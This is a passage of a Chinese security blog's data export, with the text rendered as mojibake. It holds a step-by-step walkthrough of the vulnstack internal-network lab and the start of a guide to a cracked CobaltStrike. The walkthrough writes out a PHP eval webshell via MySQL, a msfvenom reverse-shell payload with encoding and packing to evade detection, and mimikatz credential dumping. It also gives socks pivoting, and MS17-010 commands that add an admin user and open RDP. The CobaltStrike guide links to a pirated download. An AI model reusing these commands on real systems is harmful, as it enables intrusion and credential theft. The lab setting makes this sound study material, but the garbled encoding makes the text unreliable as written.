ä¸ªè¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚æºœäº†ï¼Œå­¦ä¹ å»äº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"vulnstackå†…ç½‘é¶åœº(ä¸€)ä¿å§†çº§æ•™ç¨‹","slug":"vulnstackçº¢é˜Ÿå®æˆ˜-ä¸€","date":"2021-06-03T06:03:51.000Z","updated":"2021-06-04T13:01:33.954Z","comments":true,"path":"2021/06/03/vulnstackçº¢é˜Ÿå®æˆ˜-ä¸€/","link":"","permalink":"/2021/06/03/vulnstackçº¢é˜Ÿå®æˆ˜-ä¸€/","excerpt":"","text":"æ–­æ–­ç»­ç»­æŒ–äº†å‡ å‘¨çš„æ´äº†ï¼Œæœ‰ä¸€è¯´ä¸€è¦æ¯”CTFç®€å•å¾—å¤šï¼Œè™½ç„¶äº¤ä¸Šå»æœ‰æ•ˆçš„ä¸å¤šã€‚ç„¶åæˆ‘å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯æˆ‘æ ¹æœ¬ä¸ä¼šå†…ç½‘ã€‚CTFé‡Œé¢æå°‘å‡ºç°å†…ç½‘æ¸—é€ï¼ŒåŸºæœ¬éƒ½æ˜¯ç»•è¿‡è¯»flagæˆ–è€…ç»•è¿‡getshellè¿™ç§ã€‚æ‰€ä»¥åœ¨å»å®ä¹ å‰è¿˜éœ€è¦å­¦ä¸€ä¸‹å†…ç½‘çš„çŸ¥è¯†ã€‚ä»Šå¤©åœ¨å®‰å…¨å®¢é€›è¡—çš„æ—¶å€™çœ‹åˆ°äº†è¿™ä¸ªçº¢æ—¥å®‰å…¨å›¢é˜Ÿçš„vulnstacké¶åœºï¼Œæ¥å­¦ä¹ ä¸€ä¸‹ã€‚ç½‘ä¸Šçœ‹äº†çœ‹éƒ½æ˜¯å¾ˆç®€ç•¥çš„æ•™ç¨‹ï¼Œè€Œè¿™ä¸ªé¶åœºé…ç½®çš„æ—¶å€™ç¡®å®æœ‰å¾ˆå¤šè¦æ³¨æ„çš„åœ°æ–¹ï¼Œé‚£æˆ‘å°±æ¥å†™ä¸ªä¿å§†çº§æ•™ç¨‹å§ã€‚é“¾æ¥ï¼šhttp://vulnstack.qiyuanxuetang.net/vuln/ ç¯å¢ƒæ­å»ºhttp://vulnstack.qiyuanxuetang.net/vuln/detail/2/é¦–å…ˆå«–ä¸€ä¸ªç™¾åº¦äº‘vipè´¦å·æŠŠç¯å¢ƒä¸‹è½½ä¸‹æ¥ã€‚ æ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š ä¸‹è½½å¥½ä»¥åè®¾ç½®ä¸€ä¸‹ç½‘ç»œï¼ˆæ¨¡æ‹Ÿå†…ç½‘å¤–ç½‘ 192.168.52.0/24ä¸ºæ¨¡æ‹Ÿå†…ç½‘ç¯å¢ƒã€‚ï¼ˆVmnet1ï¼‰192.168.72.0/24ä¸ºæ¨¡æ‹Ÿå…¬ç½‘ç¯å¢ƒã€‚ï¼ˆVmnet2ï¼‰æ”»å‡»è€…æœºå™¨ä¸win7çš„ç¬¬ä¸€å¼ ç½‘å¡å¤„äºVmnet1ã€‚ï¼ˆæ¨¡æ‹Ÿå…¬ç½‘ï¼‰win7çš„å¦ä¸€å¼ ç½‘å¡ä¸win2k3ã€win2k8å¤„äºVmnet2ã€‚ï¼ˆæ¨¡æ‹Ÿå†…ç½‘ï¼‰ä¸€å®šæ³¨æ„è¿™é‡Œä¸èƒ½æŠŠå…¬ç½‘å†…ç½‘å¼„åäº†ï¼Œä¸‹é¢ç›´æ¥ä¸Šå›¾ï¼škaliï¼ˆæ”»å‡»æœºï¼š Windows7 x64ï¼šï¼ˆé‡ç‚¹ï¼ï¼ï¼è¿™é‡Œå¿…é¡»æ˜¯ä¸Šé¢VMnet1ï¼Œä¸‹é¢VMnet2ï¼Œä¸èƒ½å¼„åï¼ï¼ï¼ å‰©ä¸‹çš„ä¸¤ä¸ªæŒ‰ä¸Šé¢æ–¹å¼è®¾ç½®ä¸º VMnet1 å³å¯ã€‚ æ¥ä¸‹æ¥æ˜¯é‡ç‚¹ï¼Œé‚£å°±æ˜¯win7çš„é…ç½®é¦–å…ˆè¿›å»ç”¨ç»™çš„å¯†ç hongrisec@2019ç™»å½•ã€‚ç„¶è€Œè¿›å»ä¹‹åä½ ä¼šå‘ç°phpstudyæ‰“å¼€æŠ¥é”™ï¼Œå•¥éƒ½å¹²ä¸äº†ã€‚åŸå› å¯èƒ½æ˜¯ç›®å‰è¿™ä¸ªè´¦å·çš„é—®é¢˜ï¼Œæˆ‘çš„è§£å†³æ–¹æ¡ˆï¼šhttps://jingyan.baidu.com/article/37bce2be193fd51003f3a259.html ç…§åšä¹‹åï¼Œå†æ¬¡ç™»å½•çš„åœ°æ–¹é€‰æ‹©åˆ‡æ¢è´¦å·ï¼Œè¾“å…¥god\\administratorå³å¯ç™»è¿›ä¸€å¼€å§‹çš„è´¦å·ï¼Œå¯†ç æ˜¯ä½ ä¸Šé¢è‡ªå·±è®¾ç½®çš„ã€‚ç™»è¿›å»ä¹‹ååœ¨cç›˜æ‰¾åˆ°phpstudyå¯åŠ¨å³å¯ã€‚æµ‹è¯•ï¼š pingé€šè¯´æ˜å°±æ²¡é—®é¢˜äº†ã€‚ å¤–ç½‘æ¸—é€é¦–å…ˆæ˜¯ä¿¡æ¯æ”¶é›†ï¼Œä½¿ç”¨kaliè‡ªå¸¦çš„Netdiscoveræ‰«ä¸€ä¸‹Cæ®µ netdiscover -i eth0 -r 192.168.72.0/24 -i é€‰æ‹©ç›‘æ§çš„ç½‘å¡ -r æŒ‡å®šipæ®µ nmapæ‰«ç«¯å£ è®¿é—®80ç«¯å£ ä¸€ä¸ªphpstudyæ¢é’ˆï¼Œåœ¨ä¸‹é¢æœ‰ä¸ªæµ‹è¯•è¿æ¥æ•°æ®åº“ï¼Œè¿™é‡Œä¸‹æ„è¯†æƒ³åˆ°æ„é€ mysqlæ¶æ„æœåŠ¡å™¨è¯»å–ä»»æ„æ–‡ä»¶ï¼Œç”¨è‡ªå·±vpsè¯•äº†ä¸‹ç„¶è€Œå¿˜è®°ç°åœ¨æ˜¯ä¸å‡ºç½‘çš„ã€‚ã€‚ã€‚å°è¯•æœ¬åœ°æœåŠ¡å™¨å¼±å£ä»¤root root ï¼Œæ˜¾ç¤ºè¿æ¥æ­£å¸¸ã€‚dirsearchæ‰«ä¸€é è¿™é‡Œå›¾é‡Œçš„ipæ˜¯é”™çš„ï¼Œç”¨çš„ä¹‹å‰çš„å›¾æ‡’å¾—æ”¹äº†ï¼Œæ‡‚å¾—éƒ½æ‡‚ã€‚dirå¤ªåƒåœ¾äº†æ¼äº†ä¸ªæºç beifen.rarï¼Œæ‰‹åŠ¨åŠ ä¸Šã€‚åœ¨å¤‡ä»½æ–‡ä»¶é‡Œæ‰¾åˆ°åå° å¯ä»¥ç›´æ¥ç™»åå°getshellï¼Œæ¯”è¾ƒç®€å•å°±ä¸å¼„äº†ã€‚è½¬phpadminï¼Œåˆ©ç”¨å¼±å£ä»¤ç™»å½•ã€‚ä¸€ã€into outfileå†™æœ¨é©¬æ¡ä»¶ï¼š1ã€å¯¹webç›®å½•éœ€è¦æœ‰å†™æƒé™èƒ½å¤Ÿä½¿ç”¨å•å¼•å·2ã€çŸ¥é“ç»å¯¹è·¯å¾„3ã€æ²¡æœ‰é…ç½®secure-file-priv(é™åˆ¶æ–‡ä»¶ä¼ åˆ°æŒ‡å®šç›®å½•)ï¼ˆæ³¨æ„æ˜¯æ²¡æœ‰ï¼Œä¸æ˜¯NULLï¼‰ show globals variables like &#39;secure%&#39; å†™é©¬ï¼š select &#39;&lt;?php @eval($_POST[111]);?&gt;&#39; into outfile &#39;C:/phpStudy/WWW/yxcms/troy3e.php&#39; å½“ç„¶è¿™é‡Œæ˜¯NULLæ˜¯ä¸è¡Œçš„ï¼ˆæ— æ³•åŠ¨æ€ä¿®æ”¹ï¼‰ï¼Œæ‰€ä»¥å¾—æ¢å¦ä¸€ç§æ–¹æ³•ã€‚ äºŒã€åˆ©ç”¨æ—¥å¿—æ–‡ä»¶getshell set global general_log=&#39;on&#39; çœ‹ä¸€ä¸‹æ—¥å¿—è·¯å¾„ï¼Œç°åœ¨æ‰€æœ‰æ‰§è¡Œçš„sqlè¯­å¥éƒ½ä¼šå‡ºç°åœ¨stu1.logã€‚ä½†æ˜¯è¿™ä¸ªå€¼æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œæˆ‘ä»¬æŠŠå®ƒæ”¹æˆphpï¼š set global general_log_file=&#39;C:/phpStudy/WWW/yxcms/public/troy3e.php&#39; ç°åœ¨æ‰§è¡ŒåŒ…å«ä¸€å¥è¯æœ¨é©¬è¯­å¥ï¼š select &#39;&lt;?php @eval($_POST[111]);?&gt;&#39; èšå‰‘ åå¼¹ä¸€ä¸ªMSFçš„shell msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=8888 -f exe -o win.exe #lhostæ˜¯æˆ‘ä»¬çš„ä¸»æœºipï¼Œlportæ˜¯æˆ‘ä»¬ä¸»æœºçš„ç”¨äºç›‘å¬çš„ç«¯å£ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=8888 -i 3 -e x86/shikata_ga_nai -f exe -o win.exe #ç¼–ç 3æ¬¡ è¿˜å¯ä»¥upxåŠ ä¸ªå£³é˜²æº¯æºï¼š upx -9 win.exe -k -o win2.exe æˆ‘è¿™é‡Œwin10è¯•äº†ä¸‹è¿˜æ˜¯è¢«æ€äº†ã€‚ç„¶åæ‰“å¼€msfconsoleï¼š msf &gt; use exploit/multi/handler #ä½¿ç”¨exploit/multi/handlerç›‘å¬ä»è‚‰é¸¡å‘æ¥çš„æ•°æ® msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp #è®¾ç½®payloadï¼Œä¸åŒçš„æœ¨é©¬è®¾ç½®ä¸åŒçš„payload msf exploit(handler) &gt; set lhost 192.168.72.129 #æˆ‘ä»¬çš„ä¸»æœºip msf exploit(handler) &gt; set lport 8888 #æˆ‘ä»¬çš„ä¸»æœºç«¯å£ msf exploit(handler) &gt; exploit æ‰§è¡Œmsfé©¬ ç”±äºè¿™é‡Œè¿›æ¥ç›´æ¥æ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼Œæ‰€ä»¥ç›´æ¥èƒ½æåˆ°system æ´¾ç”ŸCobaltStrikeæƒé™ç”¨CSè·å–æƒé™å’Œmsfæ²¡å•¥åŒºåˆ«ï¼Œè¿™é‡Œä¸»è¦æä¸€ä¸‹æŠŠmsfçš„shellè½¬å‘åˆ°CSä¸Šã€‚é¦–å…ˆCSä¸Šå¼€ä¸ªç›‘å¬ï¼ŒCSå’‹ç”¨æˆ‘å¥½åƒå‘äº†ä¸€ç¯‡åšå®¢äº†ã€‚ use exploit/windows/local/payload_inject set payload windows/meterpreter/reverse_http set DisablePayloadHandler true #é»˜è®¤æƒ…å†µä¸‹ï¼Œpayload_injectæ‰§è¡Œä¹‹åä¼šåœ¨æœ¬åœ°äº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œç”±äºæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨äº§ç”Ÿä¸€ä¸ªï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è®¾ç½®ä¸ºtrue set lhost xxxx #cobaltstrikeç›‘å¬çš„ip set lport 14444 #cobaltstrikeç›‘å¬çš„ç«¯å£ set session 1 #è¿™é‡Œæ˜¯è·å¾—çš„sessionçš„id exploit ç”±äºæˆ‘æ­çš„ç¯å¢ƒæ²¡æ³•å‡ºç½‘ï¼Œå°±ä¸ä¸Šå›¾äº†ã€‚ è·å–è´¦å·å¯†ç é‡æ–°è¿›å…¥åˆšåˆšçš„shell sessions -l æŸ¥çœ‹æ‰€æœ‰è·å¾—çš„session sessions -i 1 è¿›å…¥ 1ã€å¯¼å‡ºhashï¼š run hashdump æˆ–è€… run windows/gather/smart_hashdump 2ã€åŠ è½½kiwiæ¨¡å— load kiwi ä½¿ç”¨kiwiæ¨¡å—éœ€è¦systemæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä½¿ç”¨è¯¥æ¨¡å—ä¹‹å‰éœ€è¦å°†å½“å‰MSFä¸­çš„shellæå‡ä¸ºsystemã€‚æåˆ°systemæœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€æ˜¯å½“å‰çš„æƒé™æ˜¯administratorç”¨æˆ·ï¼ŒäºŒæ˜¯åˆ©ç”¨å…¶å®ƒæ‰‹æ®µå…ˆææƒåˆ°administratorç”¨æˆ·ã€‚ç„¶åadministratorç”¨æˆ·å¯ä»¥ç›´æ¥getsystemåˆ°systemæƒé™ã€‚ creds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ® creds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ® creds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ® creds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ® creds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ® creds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ® dcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯ dcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID golden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ® kerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ® kerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ® kerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ® kiwi_cmdï¼šæ‰§è¡Œmimikatzçš„å‘½ä»¤ï¼Œåé¢æ¥mimikatz.exeçš„å‘½ä»¤ lsa_dump_samï¼šdumpå‡ºlsaçš„SAM lsa_dump_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡ password_changeï¼šä¿®æ”¹å¯†ç  wifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶ wifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç  creds_all å¤±è´¥ã€‚ 3ã€åŠ è½½mimikatzæ¨¡å— åŠ è½½mimikatzæ¨¡å—é¦–å…ˆéœ€è¦å°†msfè¿ç§»åˆ°64ä½çš„è¿›ç¨‹é‡Œpsçœ‹ä¸€ä¸‹è¿›ç¨‹éšä¾¿è¿›ä¸€ä¸ª migrate 352 ç”±äºmimikatzå·²è¢«kiwiåå¹¶ï¼Œæ‰€ä»¥ç›´æ¥ï¼š kiwi_cmd sekurlsa::logonpasswords å¾—åˆ°å¯†ç ã€‚ è¿œç¨‹æ¡Œé¢ï¼ˆæ³¨æ„è¿™ä¸‹é¢å›¾é‡Œçš„ipä¹Ÿæ˜¯é”™çš„ï¼Œä¹‹å‰å†™çš„äº†ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œæ‡‚å¾—éƒ½æ‡‚ã€‚ä¸€èˆ¬æƒ…å†µä¸‹å¹¶ä¸å»ºè®®ä½¿ç”¨ç®¡ç†å‘˜è´¦æˆ·æ¥è¿œç¨‹ï¼Œå› ä¸ºè¿™æ ·ä¼šå°†ç®¡ç†å‘˜æŒ¤ä¸‹çº¿ï¼Œæš´éœ²è‡ªå·±çš„è¡ŒåŠ¨ã€‚æ‰€ä»¥æˆ‘ä»¬æ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼š éº»äº†æŠŠè‡ªå·±åŠ åˆ°ç®¡ç†å‘˜ç»„ ä¸€å¼€å§‹è®°å¾—æ²¡æ‰«å‡ºæ¥3389ç«¯å£ï¼Œè¿™é‡Œå†è¯•ä¸€æ¬¡ æœç„¶ï¼Œå¤§æ¦‚æ˜¯è¢«è¿‡æ»¤äº†ã€‚å†æ¬¡æ‰“å¼€ä¸‡èƒ½çš„msf run post/windows/manage/enable_rdp æŠ¥é”™äº†ã€‚æ‰‹åŠ¨å¼€å¯ä¹Ÿæ²¡æˆï¼Œä¼°è®¡æ˜¯è¿›ç¨‹çš„åŸå› ï¼Ÿ é‡æ–°æ‰§è¡Œä¸€éæœ¨é©¬ï¼ˆå› ä¸ºæˆ‘è¿™é‡Œè¿›åˆ°ä½æƒé™è¿›ç¨‹è·³ä¸å›å»äº†æ¢ä¸ªåˆ«çš„è¿›ç¨‹ï¼ŒæˆåŠŸï¼š rdesktop 192.168.52.143 ç„¶åæ‹¿æˆ‘ä»¬åˆšåˆšæ³¨å†Œçš„æ–°ç”¨æˆ·ç™»è¿›å»å°±è¡Œã€‚ æ·»åŠ è·¯ç”±ã€æŒ‚Socks5ä»£ç†æ·»åŠ è·¯ç”±çš„ç›®çš„æ˜¯ä¸ºäº†è®©æˆ‘ä»¬çš„MSFå…¶ä»–æ¨¡å—èƒ½è®¿é—®å†…ç½‘çš„å…¶ä»–ä¸»æœºæ·»åŠ socks4aä»£ç†çš„ç›®çš„æ˜¯ä¸ºäº†è®©å…¶ä»–è½¯ä»¶æ›´æ–¹ä¾¿çš„è®¿é—®åˆ°å†…ç½‘çš„å…¶ä»–ä¸»æœºçš„æœåŠ¡ åœ¨ä½¿ç”¨ä»£ç†ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæ·»åŠ è·¯ç”±ï¼Œè®©MSFèƒ½åˆ°è¾¾ç›®æ ‡æœºå™¨å†…ç½‘ã€‚å› ä¸ºè¿™é‡Œsocksæ¨¡å—åªæ˜¯å°†ä»£ç†è®¾ç½®ä¸ºç›‘å¬çš„ç«¯å£(é»˜è®¤æ˜¯1080),å³é€šè¿‡proxychainsçš„æµé‡éƒ½è½¬ç»™æœ¬åœ°çš„1080ç«¯å£ï¼Œåˆå› ä¸ºè¿™æ˜¯MSFèµ·çš„ç›‘å¬ç«¯å£ï¼Œæ‰€ä»¥é€šè¿‡ä»£ç†èµ°çš„æµé‡ä¹Ÿéƒ½èƒ½åˆ°è¾¾å†…ç½‘ã€‚ 1ã€æ·»åŠ è·¯ç”± æ·»åŠ å†…ç½‘è·¯ç”± run autoroute -s 192.168.52.0/24 route add 0.0.0.0 0.0.0.0 1 æ³¨æ„å…ˆbackground route print 2ã€æ­å»ºSocks4aä»£ç† use auxiliary/server/socks_proxy set version 4a set SRVHOST 0.0.0.0 //è¿™ä¸¤ä¸ªé»˜è®¤ï¼Œæ²¡ç‰¹æ®Šéœ€æ±‚å…¶å®ä¸ç”¨å¡« set SRVPORT 1080 //set USERNAME root //set PASSWORD Password@ run ç„¶åä¿®æ”¹/etc/proxychains.confåœ¨æœ€åä¸€è¡Œæ·»åŠ  socks4 127.0.0.1 1080 //è‹¥å‰é¢è®¾ç½®äº†ç”¨æˆ·åå¯†ç è¿™é‡Œè·Ÿä¸Šå³å¯ æµ‹è¯•ï¼š æ³¨æ„ï¼ï¼ï¼è¿™é‡Œæ˜¯å†…ç½‘çš„ipï¼ï¼ï¼æ˜¯52ä¸æ˜¯72ã€‚æ‰“é€šã€‚æ¥ä¸‹æ¥å°±å¯ä»¥ç”¨msfæ¨¡å—ã€nmapã€fscanè¿™ç±»å·¥å…·å¯¹å†…ç½‘è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚å½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å‘æˆ‘ä»¬çš„vpsï¼Œä½†æ˜¯å®æˆ˜å»ºè®®ä½¿ç”¨frpã€‚ åŸŸä¿¡æ¯æ”¶é›†net time /domain #æŸ¥çœ‹æ—¶é—´æœåŠ¡å™¨ net user /domain #æŸ¥çœ‹åŸŸç”¨æˆ· net view /domain #æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ net group &quot;domain computers&quot; /domain #æŸ¥çœ‹åŸŸå†…æ‰€æœ‰çš„ä¸»æœºå net group &quot;domain admins&quot; /domain #æŸ¥çœ‹åŸŸç®¡ç†å‘˜ net group &quot;domain controllers&quot; /domain #æŸ¥çœ‹åŸŸæ§ ç”±æ­¤å¯è§æˆ‘ä»¬ç°åœ¨å°±æ˜¯åŸŸç®¡ç†å‘˜æƒé™ã€‚ æ‹¿ä¸‹åŸŸæˆå‘˜ä¸»æœºæŒ‰ä¸Šé¢æ­¥éª¤è®¾ç½®å¥½äº†ä»£ç†ï¼Œå°±å¯ä»¥ç”¨å·¥å…·è¿›è¡Œä¿¡æ¯æ”¶é›†äº† proxychains nmap -p 0-1000 -Pn -sT 192.168.52.141 å› ä¸ºè¿™nmapæ‰«çš„å®åœ¨æ˜¯å¤ªæ…¢äº†ï¼Œå°±ä¸æ”¾å›¾äº†ã€‚ã€‚ã€‚ ä½¿ç”¨msfè¾…åŠ©æ¨¡å—è¿›è¡Œæ‰«æï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨ms17-010æ¼æ´ ä¸‰ä¸ªéƒ½å¯èƒ½å­˜åœ¨ã€‚ä½¿ç”¨msfçš„ä»£ç†ä¹‹åå°±ä¸èƒ½ä½¿ç”¨åå‘shelläº†ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ­£å‘shellã€‚ use auxiliary/admin/smb/ms17_010_command show options set RHOSTS 192.168.52.141 set command net user Troy3e !@#123qwe!@# /add #æ·»åŠ ç”¨æˆ· run #æˆåŠŸæ‰§è¡Œ set command net localgroup administrators Troy3e /add #ç®¡ç†å‘˜æƒé™ run #æˆåŠŸæ‰§è¡Œ set command &#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39; run #æˆåŠŸæ‰§è¡Œ ä½¿ç”¨proxychainsè¿æ¥ proxychains rdesktop 192.168.52.141 ç„¶åä½¿ç”¨exploit/windows/smb/ms17_010_psexec å°è¯•å»æ‰“ä¸€ä¸ªshellå›æ¥ æ‰“äº†åå‡ æ¬¡éƒ½æ²¡é€šï¼Œæ”¾å¼ƒäº†ã€‚ç½‘ä¸Šä¹Ÿè¯´è¿™ä¸ªæˆåŠŸç‡å¾ˆä½ï¼Œä¸»è¦è¿˜æ˜¯2003çš„åŸå› ã€‚ æ‹¿ä¸‹åŸŸæ§åœ¨å‰é¢æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†åŸŸç”¨æˆ·çš„å¸å·å¯†ç ï¼Œå³administratorã€HONGRISEC@2019æˆ‘ä»¬ç°åœ¨è¦åšçš„å°±æ˜¯å¦‚ä½•ç™»å½•åˆ°åŸŸæ§ä¸Šå»å®šä½åˆ°åŸŸæ§åˆ¶å™¨çš„ipä¸º192.168.52.138è¿˜æ˜¯å…ˆåˆ©ç”¨smbæ‰«æç³»ç»Ÿç‰ˆæœ¬ auxiliary/scanner/smb/smb_version ms17_010_psexecå¤±è´¥ æ¢MS08-067 åé¢è¯•äº†å¥½å¤šæ¨¡å—éƒ½ä¸è¡Œï¼Œä¸çŸ¥é“åŸå› ï¼Œè¿™é‡Œå°±åˆ—å‡ ç§å¯ä»¥ç”¨çš„å§ï¼Œå·²ç»æ‰“äº†å¤ªé•¿æ—¶é—´åƒä¸æ¶ˆäº†ï¼š MS17-010 CVE-2019-0708 psexecæ”»å‡» å“ˆå¸Œä¼ é€’æ”»å‡» MS14-068 å“ˆå¸Œä¼ é€’æ”»å‡»å¯ä»¥ä¸€è¯•ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"åˆè¯†CobaltStrike","slug":"åˆè¯†CobaltStrike","date":"2021-05-23T15:22:12.000Z","updated":"2021-05-24T06:31:35.814Z","comments":true,"path":"2021/05/23/åˆè¯†CobaltStrike/","link":"","permalink":"/2021/05/23/åˆè¯†CobaltStrike/","excerpt":"","text":"å¥½ä¹…æ²¡æ›´æ–°åšå®¢äº†ï¼Œè¿™å‡ æ˜ŸæœŸæ„Ÿè§‰åšäº†å¾ˆå¤šäº‹æƒ…ï¼Œåˆæ„Ÿè§‰ä»€ä¹ˆäº‹éƒ½æ²¡å¹²ã€‚åˆæƒ³æŒ–æ´ï¼Œåˆæƒ³å¾€å¼€å‘æ–¹å‘å‘å±•ï¼Œæ¯”èµ›ä¹Ÿé›¶é›¶ç¢ç¢æ‰“äº†ä¸å°‘ã€‚é©¬ä¸Šå°±è¦è¢«æ‹‰å»åšhvvå…è´¹è‹¦åŠ›äº†ï¼Œåœ¨è¿™ä¹‹å‰å­¦ä¹ ä¸€ä¸‹CSç¥å™¨çš„ä½¿ç”¨ã€‚ CobaltStrikeæ˜¯ä»€ä¹ˆCobaltStrikeæ˜¯ä¸€æ¬¾æ¸—é€æµ‹è¯•ç¥å™¨ï¼Œè¢«ä¸šç•Œäººç§°ä¸ºCSç¥å™¨ã€‚CobaliSitikeåˆ†ä¸ºå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ˜¯ä¸€ä¸ªï¼Œå®¢æˆ·ç«¯å¯ä»¥æœ‰å¤šä¸ªï¼Œå¯è¢«å›¢é˜Ÿè¿›è¡Œåˆ†å¸ƒå¼åå›¢æ“ä½œã€‚Cobaltsitrikeé›†æˆäº†ç«¯å£è½¬å‘ã€æœåŠ¡æ‰«æï¼Œè‡ªåŠ¨åŒ–æº¢å‡ºï¼Œå¤šæ¨¡å¼ç«¯å£ç›‘å¬ï¼Œwindows exeæœ¨é©¬ç”Ÿæˆï¼Œwindows dlæœ¨é©¬ç”Ÿæˆï¼Œjavaæœ¨é©¬ç”Ÿæˆï¼Œofficeå®ç—…æ¯’ç”Ÿæˆï¼Œæœ¨é©¬æ†ç»‘ã€‚é’“é±¼æ”»å‡»åŒ…æ‹¬:ç«™ç‚¹å…‹éš†ï¼Œç›®æ ‡ä¿¡æ¯è·å–ï¼Œjavaæ‰§è¡Œï¼Œæµè§ˆå™¨è‡ªåŠ¨æ”»å‡»ç­‰ç­‰ã€‚ CobaltStrikeçš„å®‰è£…æˆ‘é‡‡ç”¨çš„æ˜¯æœ€è¿‘åˆšæ”¾å‡ºæ¥çš„4.3çš„ç ´è§£ç‰ˆã€‚ é“¾æ¥ï¼šhttps://pan.baidu.com/s/1Kzv0fRcYthoP2QYHq98vTwæå–ç ï¼štvmyæ¥æºäºæŸå…¬ä¼—å·ï¼Œä½¿ç”¨åé€ æˆçš„é£é™©è‡ªè¡Œæ‰¿æ‹…ã€‚é“¾æ¥æŒ‚äº†çš„è¯ã€‚ã€‚ã€‚æŒ‚äº†å°±æŒ‚äº†ï¼Œåº”è¯¥ä¹Ÿæ²¡äººçœ‹æˆ‘åšå®¢ã€‚ä¸€ã€æœåŠ¡ç«¯å›¢é˜ŸæœåŠ¡å™¨æœ€å¥½æ­åœ¨linuxæœåŠ¡å™¨ä¸Šã€‚ æ²¡ä»€ä¹ˆç¯å¢ƒè¦æ±‚ï¼Œjdk8å³å¯ã€‚å¯åŠ¨å‘½ä»¤ï¼š./teamserver ä½ çš„ip ä½ çš„å¯†ç  ä¸Šå›¾æ‰€ç¤ºä¾¿æ˜¯æˆåŠŸå¯åŠ¨ã€‚ç«¯å£é»˜è®¤50050ï¼Œäº‘æœåŠ¡å™¨è®°å¾—æ‰‹åŠ¨å»æ§åˆ¶å°å¼€ä¸€ä¸‹ã€‚å¦‚æœä½ è¿™é‡ŒæŠ¥é”™çš„è¯ï¼Œè¯·æ£€æŸ¥ï¼š1ã€javaç‰ˆæœ¬æ˜¯å¦æ­£ç¡®ï¼ˆè¯·ä½¿ç”¨jdk8ï¼‰2ã€æ˜¯å¦æ›´æ”¹äº†teamserveré‡Œçš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¿®æ”¹äº†å¯†ç ã€‚è¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼Œæ–‡ä»¶é‡Œçš„å¯†ç 123456æ˜¯ä¸èƒ½æ›´æ”¹çš„ã€‚å¯†ç ç›´æ¥åœ¨å‘½ä»¤é‡ŒæŒ‡å®šå³å¯ã€‚ äºŒã€å®¢æˆ·ç«¯å®¢æˆ·ç«¯æˆ‘ä¸ªäººè®¤ä¸ºè¿˜æ˜¯windowsæ¯”è¾ƒæ–¹ä¾¿äº›ï¼Œç›´æ¥åŒå‡»exeè¿è¡Œå³å¯ï¼š æŒ‰ä½ è‡ªå·±é…ç½®çš„ä¿¡æ¯å†™å…¥ã€‚ ç›®å½•ä¿¡æ¯åŠå‚æ•°è¯´æ˜CobaltStrikeâ€”äº›ä¸»è¦æ–‡ä»¶åŠŸèƒ½å¦‚ä¸‹: agscript:æ‰©å±•åº”ç”¨çš„è„šæœ¬ c2lint:ç”¨äºæ£€æŸ¥profileçš„é”™è¯¯å’Œå¼‚å¸¸ teamserver:æœåŠ¡å™¨ç«¯å¯åŠ¨ç¨‹åº cobaltstrike.jar: CobaltStrikeæ ¸å¿ƒç¨‹åº 